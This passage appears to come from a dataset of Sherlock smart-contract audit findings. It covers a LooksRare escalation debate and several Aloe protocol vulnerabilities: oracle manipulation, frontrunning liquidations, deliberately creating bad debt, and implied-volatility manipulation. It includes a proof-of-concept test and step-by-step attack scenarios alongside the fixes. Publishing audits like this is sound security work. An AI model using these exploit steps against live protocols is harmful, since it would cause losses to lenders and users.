closes. After that, the escalation becomes final.\nnevillehuang\nThis is the only comment I will make about this submission, and I will leave the rest up to @nasri136 @Evert0x .\nI agree this is a valid issue, but the fact is in the accepted risk section it mentions that ANY and i repeat ANY issue not just network congestion causing randomness request to fail is an accepted risk. If the game is not completed, then admin can always call `emergencyWithdraw()`, so as long as this function is not DoSed (which is not possible unless game has ended), then I am simply following sherlocks rules:\nHierarchy of truth: Contest README > Sherlock rules for valid issues > Historical decisions. While considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order. For example: In case of conflict between Sherlock rules vs Sherlock's historical decision, Sherlock criteria for issues must be considered the source of truth. In case of conflict between information in the README vs Sherlock rules, the README overrides Sherlock rules.\nAnd yes private/discord messages does not matter:\nDiscord messages or DM screenshots are not considered sources of truth while judging an issue/escalation especially if they are conflicting with the contest README.\ngstoyanovbg\nI understand your point. However, still believe that the 'Accepted Risks' section is not formulated well enough, and this case should definitely be excluded from its scope. I am aware of Sherlock's rules, but in my opinion, there are nuances even in them, and they cannot be 100% accurate for all situations. I see that report #107 by @PlamenTSV, which is same issue as this, has labels ""Sponsor Confirmed"" and ""Will fix."" Also, @0xhiroshi has made a pull request for a fix which makes me happy because at the end of the day our goal is to have a secure, bug free protocol. However, it sounds strange to claim that a vulnerability is an ""accepted risk"" but at the same time to fix it. Looking forward for the final decision of the judges. If you have any questions, I am ready to assist.\nnevillehuang\n@gstoyanovbg I totally get your point too and agree with you. If I didn’t have to follow sherlock rules, I would have side with the watsons and validated this finding. But the fact that in the accepted risks section they used the word ANY is too strong of a word for me to ignore.\nPlamenTSV\nDon't sherlock rules serve as a guideline? I hope most if not every watson that has read this issue agrees it is valid. The judges agree it is valid by severity and even the sponsors themselves want to fix it and deem it a valid finding. I think the reason the README is like this is because the protocol team did not expect that their protocol could have a DoS of this caliber - thus why they overlook the README and confirm the issue. It would be a shame to get robbed of a valid finding with no reward, worse ratio for the platform, but for the protocol to aknowledge and fix. There should be some kind of workaround for these kinds of scenarios. I believe that would be most fair and I hope you agree. If we could get a sherlock admin to give clarity to the situation it would be appreciated, thanks to everyone in the comments.\nPlamenTSV\nThis is the only comment I will make about this submission, and I will leave the rest up to @nasri136 @Evert0x .\nI agree this is a valid issue, but the fact is in the accepted risk section it mentions that ANY and i repeat ANY issue not just network congestion causing randomness request to fail is an accepted risk. If the game is not completed, then admin can always call `emergencyWithdraw()`, so as long as this function is not DoSed (which is not possible unless game has ended), then I am simply following sherlocks rules:\nHierarchy of truth: Contest README > Sherlock rules for valid issues > Historical decisions. While considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order. For example: In case of conflict between Sherlock rules vs Sherlock's historical decision, Sherlock criteria for issues must be considered the source of truth. In case of conflict between information in the README vs Sherlock rules, the README overrides Sherlock rules.\nAnd yes private/discord messages does not matter:\nDiscord messages or DM screenshots are not considered sources of truth while judging an issue/escalation especially if they are conflicting with the contest README.\nOne thing to add while rereading this comment, shouldn't Sponsor final confirmation >>> contest readmi, exactly because some issue's severity can go overlooked, just like in the current case\nnevillehuang\nAfaik, Sponsor confirmation has never been the deciding factor for a finding. It has always been sherlock rules, contest details and the code itself. To note, this rules are introduce to ensure judging consistency in the first place.\nI agree that this finding is valid, and it is unfair to watsons for not being rewarded. But it is also very unfair to me for potentially having my judging points penalized because the source of ambiguity is not because of me. I think all watsons know judging is not easy, and the rules revolving judging is extremely strict. Even one miss finding by me will heavily penalize me.\nI leave this in the hands of @Evert0x @nasri136 and will respect any final outcome.\nCzar102\nFirst off, the status of whether the sponsor wants to fix the issue has nothing to do with its validity. Please don't use it as an argument of judgement.\nSecondly, I understand @nevillehuang about the strictness of the judging rules and potential payout issues. Will see what can I do about it in this case. The mechanism shouldn't bias you towards maintaining the current judgement, so if you have concerns with that, we can try to resolve those rewarding formula issues in DMs.\nAbout the issue, it is true that it is unfortunately conflicting with the README. I think we should rethink the way the docs describes the hierarchy of truth.\nAudits exist not only to show outright mistakes in the code. Auditors' role is to show that some properties (that are important to parties using the code) are not enforced or fulfilled. They need to think in a broader sense than the sponsors did, in order to provide any more insight above the technical one. Auditors need to teach sponsors not only about issues, but also about the impacts. ""Why is this property a problem?""\nSponsors can't know what wording to use not to exclude the bugs they don't care about. Because that's not their job. It's our job to understand their needs. We work for them to secure their code. We tell them what do they need.\nWhat sponsors probably meant by ""any reason causing the randomness request not to be fulfilled"" is most likely ""any external reason causing the randomness request not to be fulfilled"". They didn't think it could be their contract causing this issue. I think some Watsons correctly identified what sponsors intended to convey and should be rewarded for submitting the issue.\nWill alter the docs to account for this kind of situations.\nCould you share your feedback on the above approach? @nevillehuang @PlamenTSV @gstoyanovbg\nPlamenTSV\nI am glad you understand the aspect of the README file overlooking the potential issues. It is not that they do not accept issues like this, it is the fact that they did not expect their contract to be at fault for them. I believe us watsons did in fact identify a valid problem, adhering both to the sherlock criteria and the sponsor's needs (we understand their confirmation is not a valid judgement, but it can be an argument that they did a mistake in the README), and hopefully I am speaking for everyone when I say I am glad we reached such a fair outcome. I am looking forward to seeing some docs changes for edge-case scenarios like this so they can be more easily resolved in the future. Thanks for the hard work!\nnevillehuang\nHi @Czar102, I will share with you how I interpreted this while judging. In addition to the conflicted READ.ME, the `emergencyWithdraw` function exists in the first place to deal with such scenarios, that is why i deemed it as an accepted risk since funds can always be rescued by trusted admins.\nWhile I also understand the other side of the equation, I will share with you what I think is the only possible fair outcome for both watsons auditing and judging. I also want to clarify that unfairness goes both ways, but arguably even more so for judging since judging has way stricter rules.\nHi all heres my input for the findings regarding 107 & 136. In my opinion, the only fair outcome for all parties for 107 & 136 is to validate the finding as medium severity and waive its potential impact on my judging status. After all, the finding has provided significant value to the sponsor given the fix implemented. But you can see from the current judging state that there will likely be less than 10 issues, so one missed issue by me can lead to heavy penalisation of my judging points or maybe even lead me to not make the minimum 80% recall threshold. I have included this in part of my growing list of suggestion for improvement to sherlock, that is we possibly need a period of 24-48 hour for sponsor to clarify/edit any doubts regarding contest details. Lead judge/head of judging can facilitate in this. Of course this is just my opinion, I leave the rest up to the temporary head of judging and sherlock\ngstoyanovbg\n@Czar102, I agree with everything you've said, and I share your philosophy on the work of auditors. Regarding the rules for judging, in my opinion, they cannot cover all possible cases, especially those that have not arisen before. They should evolve over time, and in the event of a situation, the Sherlock team should be able to make a decision so that there are no affected judges and auditors. @nevillehuang, I still believe this is a high severity issue, but at the same time, it is not fair to be punished because you acted according to the defined rules. I hope a solution can be found.\nCzar102\nthe `emergencyWithdraw` function exists in the first place to deal with such scenarios\nNevertheless, the contract doesn't function correctly. I think that because it is possible to rescue funds, it can be a medium severity issue. Players who were supposed to win in a game don't get their funds, but the EV doesn't change. The result is never uncovered. Hence medium.\nBecause judges who approached this issue ""by the book"" would lose out on this outcome, this issue and duplicates will not count towards the judging contest reward calculation.\n@nevillehuang @nasri136 Please let me know whether, according to the above approach, #72 should be considered valid or not. It seems it presents another issue.\nCzar102\nResult: Medium Has duplicates\nThe issue and duplicates will not be counted towards the judging payout.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\ngstoyanovbg: accepted\nPlamenTSV: accepted\ngstoyanovbg\n@Czar102, allow me to disagree with the severity of the report. I'm not sure if I have the right to dispute it after the escalation is resolved, but here are my arguments:\nI agree that the funds can be rescued using emergencyWithdraw(). However, the funds locked in one iteration of the game are insignificant compared to the indirect losses from such an event. The success of luck-based games is directly tied to the trust of the players in the game creators. If the game is interrupted at a crucial moment (which is very likely), the affected players will certainly question the fairness of the game. Can they be sure that this is not intentionally caused for someone not to win the prize? The damage to the brand's reputation will be irreversible. In addition to the missed profits from hundreds of future iterations of the game, developers will incur losses from the funds invested in development.\nI mentioned earlier that when we talk about financial losses, we should also consider the losses for users from gas fees (may have thousands of players). We all know what the fees on the Ethereum mainnet can be, especially in moments of network congestion. For a player whose agent is wounded, it may be extremely important to heal it regardless of the fee paid. When funds are withdrawn through emergencyWithdraw() and returned to the players, they should be compensated for gas fees. These funds must be paid either by Looksrare or the players. In both cases, someone loses.\nThe time lost by players to play a game that suddenly stops and cannot continue should also be taken into account. Even if the game starts again from the beginning and everything is fine, it cannot start from the same state it was interrupted. A player may have been in a position where they were likely to win a prize, but they probably won't be compensated for it. Even if they are, it will be at the protocol's expense.\nConsidering 1), 2), and 3), my position is that there are much larger losses for each party than just the funds locked in the contract at the time of the interruption.\nCzar102\nCan they be sure that this is not intentionally caused for someone not to win the prize?\nIf that's the case, this could have been a high severity issue. I don't think that the report mentions such a scenario though.\nThe damage to the brand's reputation will be irreversible.\nThat's true, but that is not a high severity vulnerability. A high severity vulnerability is when there is a direct and very probable loss of funds, which is not the case here.\nThese funds must be paid either by Looksrare or the players. In both cases, someone loses.\nThe gas costs are out of scope here. The fact that the user plays the game is a ""value gotten"" for the gas. Anyway, even if, there would be no high severity impact because of gas.\nA player may have been in a position where they were likely to win a prize, but they probably won't be compensated for it.\nWe don't know that. Maybe the protocol would distribute the rewards proportionally to the EV of the players in a given position given an optimal strategy?\nThis is why I chose a Medium severity for this issue.\ngstoyanovbg\nIf that's the case, this could have been a high severity issue. I don't think that the report mentions such a scenario though.\nMe and you know that this is not true, but for people which are not solidity developers / auditors it is not clear and creates reasonable doubt about the fairness of the game and its creators\nThat's true, but that is not a high severity vulnerability. A high severity vulnerability is when there is a direct and very probable loss of funds, which is not the case here.\nI agree there is no direct loss of funds but we have an issue that breaks core contract functionality, rendering the protocol/contract useless + indirect loss of funds on a large scale.\nWe don't know that. Maybe the protocol would distribute the rewards proportionally to the EV of the players in a given position given an optimal strategy?\nThat would be the right decision. However, there is no way to do it in a good enough manner because there is no way to prove which player had what financial resources for the game. This is a very important variable for the potential mathematical model. For example, two agents who have survived until round X and have been healed three times will have equal weight if the game is interrupted at that moment. However, the player behind the first may no longer have the financial ability to heal the agent, while the second may be able to heal it three more times without any problem.\nCzar102\nMe and you know that this is not true, but for people which are not solidity developers / auditors it is not clear and creates reasonable doubt about the fairness of the game and its creators\nThis is exactly why we have this job. We need to tell them. And this impact doesn't seem to be the case here.\nHowever, there is no way to do it in a good enough manner because there is no way to prove which player had what financial resources for the game.\nYes, but I feel that's an insufficient impact to consider a high severity impact. In the end, they might make another contract and continue the game ;) Ofc that would be costly but the loss of funds is extremely limited here. This is why it's Medium.\n0xhiroshi\nhttps://github.com/LooksRare/contracts-infiltration/pull/165\nSergeKireev\nFix LGTM"чDOS of the protocol and inability to continue the game.\nCode Snippet\nTool used\nManual Review
Oracle.sol: manipulation via increasing Uniswap V3 pool observationCardinalityчhighч```\nstruct Observation {\n    // the block timestamp of the observation\n    uint32 blockTimestamp;\n    // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized\n    int56 tickCumulative;\n    // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized\n    uint160 secondsPerLiquidityCumulativeX128;\n    // whether or not the observation is initialized\n    bool initialized;\n}\n```\nчThe `Oracle.consult` function takes a `uint40 seed` parameter and can be used in either of two ways:\nSet the highest 8 bit to a non-zero value to use Uniswap V3's binary search to get observations\nSet the highest 8 bit to zero and use the lower 32 bits to provide hints and use the more efficient internal `Oracle.observe` function to get the observations\nThe code for Aloe's `Oracle.observe` function is adapted from Uniswap V3's Oracle library.\nTo understand this issue it is necessary to understand Uniswap V3's `observationCardinality` concept.\nA deep dive can be found here.\nIn short, it is a circular array of variable size. The size of the array can be increased by ANYONE via calling `Pool.increaseObservationCardinalityNext`.\nThe Uniswap V3 `Oracle.write` function will then take care of actually expanding the array once the current index has reached the end of the array.\nAs can be seen in this function, uninitialized entries in the array have their timestamp set to `1`.\nAnd all other values in the observation struct (array element) are set to zero:\n```\nstruct Observation {\n    // the block timestamp of the observation\n    uint32 blockTimestamp;\n    // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized\n    int56 tickCumulative;\n    // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized\n    uint160 secondsPerLiquidityCumulativeX128;\n    // whether or not the observation is initialized\n    bool initialized;\n}\n```\n\nHere's an example for a simplified array to illustrate how the Aloe `Oracle.observe` function might read an invalid value:\n```\nAssume we are looking for the target=10 timestamp.\n\nAnd the observations array looks like this (element values are timestamps):\n\n| 12 | 20 | 25 | 30 | 1 | 1 | 1 |\n\nThe length of the array is 7.\n\nLet's say we provide the index 6 as the seed and the current observationIndex is 3 (i.e. pointing to timestamp 30)\n\nThe Oracle.observe function then chooses 1 as the left timestamp and 12 as the right timestamp.\n\nThis means the invalid and uninitialized element at index 6 with timestamp 1 will be used to calculate the Oracle values.\n```\n\nHere is the section of the `Oracle.observe` function where the invalid element is used to calculate the result.\nBy updating the observations (e.g. swaps in the Uniswap pool), an attacker can influence the value that is written on the left of the array, i.e. he can arrange for a scenario such that he can make the Aloe `Oracle` read a wrong value.\nUpstream this causes the Aloe `Oracle` to continue calculation with `tickCumulatives` and `secondsPerLiquidityCumulativeX128s` haing a corrupted value. Either `secondsPerLiquidityCumulativeX128s[0]`, `tickCumulatives[0]` AND `secondsPerLiquidityCumulativeX128s[1]`, `tickCumulatives[1]` or only `secondsPerLiquidityCumulativeX128s[0]`, `tickCumulatives[0]` are assigned invalid values (depending on what the timestamp on the left of the array is).чThe `Oracle.observe` function must not consider observations as valid that have not been initialized.\nThis means the `initialized` field must be queried here and here and must be skipped over.\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nhigh, great valid finding. It appears the price can only be made extremely high and most probably it's almost impossible to avoid seemsLegit to be true (because only one of the 2W-W or W-0 windows can be manipulated, the other will have correct value), but due to another bug, liquidation ignores seemsLegit, so at the very least this manipulation allows to liquidate almost all accounts with borrows, which is enough for it to be high.\nMohammedRizwan commented:\nseems intended design\nhaydenshively\nJust note that #114 is not a duplicate.\nhaydenshively\nFixed in https://github.com/aloelabs/aloe-ii/pull/217ч"The corrupted values are then used in the further calculations in `Oracle.consult` which reports its results upstream to `VolatilityOracle.update` and `VolatilityOracle.consult`, making their way into the core application.\nThe TWAP price can be inflated such that bad debt can be taken on due to inflated valuation of Uniswap V3 liqudity.\nBesides that there are virtually endless possibilities for an attacker to exploit this scenario since the Oracle is at the very heart of the Aloe application and it's impossible to foresee all the permutations of values that a determined attacker may use.\nE.g. the TWAP price is used for liquidations where an incorrect TWAP price can lead to profit. If the protocol expects you to exchange 1 BTC for 10k USDC, then you end up with ~20k profit.\nSince an attacker can make this scenario occur on purpose by updating the Uniswap observations (e.g. by executing swaps) and increasing observation cardinality, the severity of this finding is ""High"".\nCode Snippet\nTool used\nManual Review"
It is possible to frontrun liquidations with self liquidation with high strain value to clear warning and keep unhealthy positions from liquidationчhighч```\nslot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);\n```\nч"`Borrower.warn` sets the time when the liquidation (involving swap) can happen:\n```\nslot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);\n```\n\nBut `Borrower.liquidation` clears the warning regardless of whether account is healthy or not after the repayment:\n```\n_repay(repayable0, repayable1);\nslot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n```\n\n```\nfunction test_liquidationFrontrun() public {\n    uint256 margin0 = 1595e18;\n    uint256 margin1 = 0;\n    uint256 borrows0 = 0;\n    uint256 borrows1 = 1e18 * 100;\n\n    // Extra due to rounding up in liabilities\n    margin0 += 1;\n\n    deal(address(asset0), address(account), margin0);\n    deal(address(asset1), address(account), margin1);\n\n    bytes memory data = abi.encode(Action.BORROW, borrows0, borrows1);\n    account.modify(this, data, (1 << 32));\n\n    assertEq(lender0.borrowBalance(address(account)), borrows0);\n    assertEq(lender1.borrowBalance(address(account)), borrows1);\n    assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);\n    assertEq(asset1.balanceOf(address(account)), borrows1 + margin1);\n\n    _setInterest(lender0, 10100);\n    _setInterest(lender1, 10100);\n\n    account.warn((1 << 32));\n\n    uint40 unleashLiquidationTime = uint40((account.slot0()  208) % (1 << 40));\n    assertEq(unleashLiquidationTime, block.timestamp + LIQUIDATION_GRACE_PERIOD);\n\n    skip(LIQUIDATION_GRACE_PERIOD + 1);\n\n    // listen for liquidation, or be the 1st in the block when warning is cleared\n    // liquidate with very high strain, basically keeping the position, but clearing the warning\n    account.liquidate(this, bytes(""""), 1e10, (1 << 32));\n\n    unleashLiquidationTime = uint40((account.slot0()  208) % (1 << 40));\n    assertEq(unleashLiquidationTime, 0);\n\n    // the liquidation command we've frontrun will now revert (due to warning not set: ""Aloe: grace"")\n    vm.expectRevert();\n    account.liquidate(this, bytes(""""), 1, (1 << 32));\n}\n```\n\nCode Snippet\nThis makes any liquidation (even the one which doesn't affect assets much due to high strain amount) clear the warning.\nTool used\nManual Review"ч"Consider clearing ""warn"" status only if account is healthy after liquidation.\nDiscussion\npanprog\nEscalate\nThis should be High, because the issue allows to freely (other than gas) DOS your own liquidation while keeping your account unhealthy. This opens up a lot of attack vectors and can substantially harm the protocol by creating bad debt.\nIn previous contests DOS'ing your liquidation was considered High.\nAdditionally, the user doesn't need to do this every transaction, just every 2 minutes to clear `warn`, so this is very cheap, basically free compared to possible profit user can get (for example, if he has 2 reverse ""positions"" opened - borrow usdt against eth and borrow eth against usdt - one of them goes into bad debt he doesn't have to pay, the other will be in a profit) and possible protocol loss of funds (due to bad debt).\nConsidering all this, I believe this is clearly a high issue, not medium.\nsherlock-admin2\nEscalate\nThis should be High, because the issue allows to freely (other than gas) DOS your own liquidation while keeping your account unhealthy. This opens up a lot of attack vectors and can substantially harm the protocol by creating bad debt.\nIn previous contests DOS'ing your liquidation was considered High.\nAdditionally, the user doesn't need to do this every transaction, just every 2 minutes to clear `warn`, so this is very cheap, basically free compared to possible profit user can get (for example, if he has 2 reverse ""positions"" opened - borrow usdt against eth and borrow eth against usdt - one of them goes into bad debt he doesn't have to pay, the other will be in a profit) and possible protocol loss of funds (due to bad debt).\nConsidering all this, I believe this is clearly a high issue, not medium.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nroguereddwarf\n@panprog This finding requires the assumption that you can over a long period of time continuously front-run liquidation bots. You need to do it every 2 minutes.\nEven if there's a small chance of 1% that the liquidation bot is faster, the chance that this DOS stays active for more than 24 hours is: 24 hours / 2 minutes = 720. Chance of 720 successful front-runs in a row: 0.99^720 = ~0.07%.\nHence this is not a High due to Low likelihood. Medium is justified.\npanprog\nIn the previous contests front-running liquidator to prevent liquidation was considered high, even when it was required to front-run liquidator every block, for example in Symmetrical: https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/233\nSo for judging consistency I believe that similar issues should be judged high as well. especially since this issue requires front-running only once per 2 minutes, not once per block.\nroguereddwarf\n@panprog\nThanks for bringing this other issue to my attention I hadn't seen that. In that case I can see where the ""High"" severity is coming from.\nJust want to add that due to the implied volatility calculations in Aloe there is a margin of safety built into Aloe and liquidations don't need to occur instantly, liquidations can take up to 24 hours and there should be no bad debt. I.e. the price should not be able to move within 24 hours in a way that would cause bad debt.\nAnd based on my previous calculation, the risk of bad debt is therefore Low.\nI still think this should be Medium based on the protocol-specific considerations.\npanprog\n@roguereddwarf I certainly understand your reasoning and it's valid. However, while this protocol has much larger safety margin, which requires longer time until bad debt can happen, this is still comparable to my reference in Symmetrical, where frontrunning liquidation required doing this every block, but bad debt could have happened sooner than here. So, number of blocks in Symmetrical and number of 2-minute intervals here are probably roughly similar.\nI want to add another reason for this to be high - in the current state of the code there are the other issues (such as volatility manipulations) which can be combined with this one to make it high.\nTrumpero\nPlanning to accept escalation and upgrade this issue to high.\nThe impact should be high because the attacker can prevent liquidation by front-running. The likelihood should be between medium and high, even if it requires many successful instances of front-running.\nCzar102\nResult: High Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\npanprog: accepted"чVery important protocol function (liquidation) can be DOS'ed and make the unhealthy accounts avoid liquidations for a very long time. Malicious users can thus open huge risky positions which will then go into bad debt causing loss of funds for all protocol users as they will not be able to withdraw their funds and can cause a bank run - first users will be able to withdraw, but later users won't be able to withdraw as protocol won't have enough funds for this.
`Borrower`'s `modify`, `liquidate` and `warn` functions use stored (outdated) account liabilities which makes it possible for the user to intentionally put him into bad debt in 1 transactionчhighч```\n  User borrow:: 10629296791890000000000\n  User stored borrow:: 10000000000000000000000\n  Before liquidation User borrow:: 10630197795010000000000\n  Before liquidation User stored borrow:: 10630197795010000000000\n  Before liquidation User assets:: 10051000000000000000000\n  Liquidated User borrow:: 579197795010000000001\n  Liquidated User assets:: 0\n```\nчPossible scenario for the intentional creation of bad debt:\nBorrow max amount at max leverage + some safety margin so that position is healthy for the next few days, for example borrow 10000 DAI, add margin of 1051 DAI for safety (51 DAI required for `MAX_LEVERAGE`, 1000 DAI safety margin)\nWait for a long period of market inactivity (such as 1 day).\nAt this point `borrowBalance` is greater than `borrowBalanceStored` by a value higher than `MAX_LEVERAGE` (example: `borrowBalance` = 10630 DAI, `borrowBalanceStored` = 10000 DAI)\nCall `modify` and withdraw max possible amount (based on borrowBalanceStored), for example, withdraw 1000 DAI (remaining assets = 10051 DAI, which is healthy based on stored balance of 10000 DAI, but in fact this is already a bad debt, because borrow balance is 10630, which is more than remaining assets). This works, because liabilities used are outdated.\nAt this point the user is already in bad debt, but due to points 1-2, it's still not liquidatable. After calling `Lender.accrueInterest` the account can be liquidated. This bad debt caused is the funds lost by the other users.\nThis scenario is not profitable to the malicious user, but can be modified to make it profitable: the user can deposit large amount to lender before these steps, meaning the inflated interest rate will be accured by user's deposit to lender, but it will not be paid by the user due to bad debt (user will deposit 1051 DAI, withdraw 1000 DAI, and gain some share of accured 630 DAI, for example if he doubles the lender's TVL, he will gain 315 DAI - protocol fees).\nExecution console log:\n```\n  User borrow:: 10629296791890000000000\n  User stored borrow:: 10000000000000000000000\n  Before liquidation User borrow:: 10630197795010000000000\n  Before liquidation User stored borrow:: 10630197795010000000000\n  Before liquidation User assets:: 10051000000000000000000\n  Liquidated User borrow:: 579197795010000000001\n  Liquidated User assets:: 0\n```\n\nAs can be seen, in the end user debt is 579 DAI with 0 assets.\nCode Snippet\nTool used\nManual ReviewчConsider using `borrowBalance` instead of `borrowBalanceStored` in `_getLiabilities()`.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nMohammedRizwan commented:\nvalid issue\nhaydenshively\nFixed in https://github.com/aloelabs/aloe-ii/pull/205чMalicious user can create bad debt to his account in 1 transaction. Bad debt is the amount not withdrawable from the lender by users who deposited. Since users will know that the lender doesn't have enough assets to pay out to all users, it can cause bank run since first users to withdraw from lender will be able to do so, while those who are the last to withdraw will lose their funds.
IV Can be Decreased for Freeчhighч```\n            return SoladyMath.sqrt((4e24 * volumeGamma0Gamma1 * scale) / (b.timestamp - a.timestamp) / tickTvl);\n```\nчThe liquidity at a single `tickSpacing` is used to calcualte the `IV`. The more liquidity is in this tick spacing, the lower the `IV`, as demonstarated by the `tickTvl` dividing the return value of the `estimate` function:\n```\n            return SoladyMath.sqrt((4e24 * volumeGamma0Gamma1 * scale) / (b.timestamp - a.timestamp) / tickTvl);\n```\n\nSince this is using data only from the block that the function is called, the liuquidyt can easily be increased by:\ndepositing a large amount liquidity into the `tickSpacing`\ncalling update\nremoving the liquidity\nNote that only a small portion of the total liquidity is in the entire pool is in the active liquidity tick. Therefore, the capital cost required to massively increase the liquidity is low. Additionally, the manipulation has zero cost (aside from gas fees), as no trading is done through the pool. Contract this with a pool price manipulation, which costs a significant amount of trading fees to trade through a large amount of the liquidity of the pool.\nSince this manipulation costs nothing except gas, the `IV_CHANGE_PER_UPDATE` which limits of the amount that IV can be manipulated per update does not sufficiently disincentivise manipulation, it just extends the time period required to manipulate.\nDecreasing the IV increases the LTV, and due to the free cost, its reasonable to increase the LTV to the max LTV of 90% even for very volatile assets. Aloe uses the IV to estimate the probability of insolvency of loans. With the delay inherent in TWAP oracle and the liquidation delay by the warn-then-liquidate process, this manipulation can turn price change based insolvency from a 5 sigma event (as designed by the protocol) to a likely event.чUse the time weighted average liquidity of in-range ticks of the recent past, so that single block + single tickSpacing liquidity deposits cannot manipulate IV significantly.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nMohammedRizwan commented:\nvalid\npanprog\nEscalate\nThis should be medium, not high. While the volatility can really be decreased and allows more risky positions to be healthy, this will not cause any immediate loss of funds. Liquidations will still happen normally even with 90% LTV. In order to actually cause some loss of funds - a large and quick change of price is required, when liquidators can not liquidate in time. And this is not very likely event, so medium is more appropriate.\nsherlock-admin2\nEscalate\nThis should be medium, not high. While the volatility can really be decreased and allows more risky positions to be healthy, this will not cause any immediate loss of funds. Liquidations will still happen normally even with 90% LTV. In order to actually cause some loss of funds - a large and quick change of price is required, when liquidators can not liquidate in time. And this is not very likely event, so medium is more appropriate.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nroguereddwarf\nConsidering that IV and dynamic LTV is the main security mechanism to deal with sudden price movements and one of Aloe's main selling points is the robustness against sudden price movements, I think this can be considered a High.\nWe have seen in crypto many times how a pair can move 10% within minutes which is enough to cause bad debt and a loss to lenders.\nIf the manipulation wasn't possible, the LTV would be much lower for such a pair.\nhaydenshively\nFixed in https://github.com/aloelabs/aloe-ii/pull/214\ncvetanovv\nhaydenshively Do you think it should stay High or be downgraded to Medium?\nhaydenshively\nI think High makes sense because of how important IV is to the protocol\nCzar102\nThis issue presents a bypass of protocol's risk management, hence I think High severity is accurate. Planning to reject the escalation and leave the issue as is.\nCzar102\nResult: High Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\npanprog: rejectedчDecreasing IV can be done at zero cost aside from gas fees.\nThis can be used to borrow assets at far more leverage than the proper LTV\nBorrowers can use this to avoid liquidation\nThis also breaks the insolvency estimation based on IV for riskiness of price-change caused insolvency.\nCode Snippet\nTool used\nManual Review
Uniswap Formula Drastically Underestimates Volatiltyчmediumч```\n//@notice Estimates implied volatility using this math - https://lambert-guillaume.medium.com/on-chain-volatility-and-uniswap-v3-d031b98143d1).\n```\nч"Note: This report will use annualised IV expressed in % will be use, even though the code representation uses different scaling.\nAloe estimates implied volatility based on the article cited below (taken from in-line code comments)\n```\n//@notice Estimates implied volatility using this math - https://lambert-guillaume.medium.com/on-chain-volatility-and-uniswap-v3-d031b98143d1).\n```\n\nLambert's article describes a method of valuing Uniswap liquidity positions based on volatility. It is correct to say that the expected value of holding an LP position can be determined by the formula referenced in the article. A liquidity position can be valued with the same as ""selling a straddle"" which is a short-volatility strategy which involves selling both a put and a call. Lambert does this by representing fee collection as an options premium and impermanat loss as the cost paid by the seller when the underlying hits the strike price. If the implied volatility of a uniswap position is above the fair IV, then it is profitable to be a liquidity provider, if it is lower, than it is not.\nKEY POINT: However, this does not mean that re-arranging the formula to derive IV gives a correct estimation of IV.\nThe assumptions of the efficient market hypothesis holds true only when there is a mechanism and incentive for rational actors to arbitrage the value of positions to fair value. There is a direct mechanism to push down the IV of Uniswap liquidity positions - if the IV is too high then providing liquidity is +EV, so rational actors would deposit liquidity, and thus the IV as calculated by Aloe's formula will decrease.\nHowever, when the `IV` derived from Uniswap fees and liquidity is too low, there is no mechanism for rational actors to profit off correcting this. If you are not already a liquidity provider, there is no way to provide ""negative liquidity"" or ""short a liquidity position"".\nIn fact the linked article by Lambert Guillaume contains data which demonstrates this exact fact - the table which shows the derived IV at time of writing having far lower results than the historical volatilities and the the IV derived from markets that allow both long and short trading (like options exchanges such as Deribit).\nHere is a quote from that exact article, which points out that the Uniswap derived IV is sometimes 2.5x lower. Also check out the table directly in the article for reference:\n```\n""The realized volatility of most assets hover between 75% and 200% annualized in ETH terms. If we compare this to the IV extracted from the Uniswap v3 pools, we get:\n\nNote that the volatilities are somewhat lower, perhaps a factor of ~2.5, for most assets.""\n```\n\nThe `IV's` in options markets or protocols that have long-short mechanisms such as Opyn's Squeeth have a correction mechanism for `IV's` which are too low, because you can both buy and sell options, and are therefore ""correct"" according to Efficient Market Hypothesis. The Uniswap pool is a ""long-only"" market, where liquidity can be added, but not shorted, which leads to systematically lower `IV` than is realistic. The EMH model, both in soft and hard form, only holds when there is a mechnaism for a rational minority to profit off correcting a market imbalance. If many irrational or utilitarian users deposits too much liquidity into a Uniswap v3 pool relative to the fee capture and `IV`, theres no way to profit off correcting this imbalance.\nThere are 3 ways to validate the claim that the Uniswap formula drastically underestimates the IV:\nOn chain data which shows that the liquidty and fee derivation from Uniswap gives far lower results than other\nThe table provided in Lambert Guillaume's article, which shows a Uniswap pool derived IVs which are far lower than the historical volatilities of the asset.\nStudies showing that liquidity providers suffer far more impermanent loss than fees."ч"2 possible options (excuse the pun):\nUse historical price differences in the Uniswap pool (similar to a TWAP, but Time Weighted Average Price Difference) and use that to infer volatilty alongside the current implementations which is based on fees and liquidity. Both are inaccurate, but use the `maximum` of the two values. The 2 `IV` calculations can be used to ""sanity check"" the other, to correct one which drastically underestimates the risk\nSame as above, use the `maximum` of the fee/liquidity derived `IV` but use a market that has long/short possibilities such as Opyn's Squeeth to sanity check the `IV`.\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nlow, because the risk of liquidation has a huge margin of error built-in, so that 2.5 IV underestimation is not really a problems and is covered by the safety margin of the values used. Besides, all the other solutions are not very universal and do not guarantee much better IV estimation anyway.\nMohammedRizwan commented:\nseems intended design\nhaydenshively\nThis is medium severity because governance can increase `nSigma` from the default of 5 up to a maximum of 8. This 60% increase should be enough to compensate for systematic error arising from the not-quite-efficient market (and Panoptic should be available soon, making it more 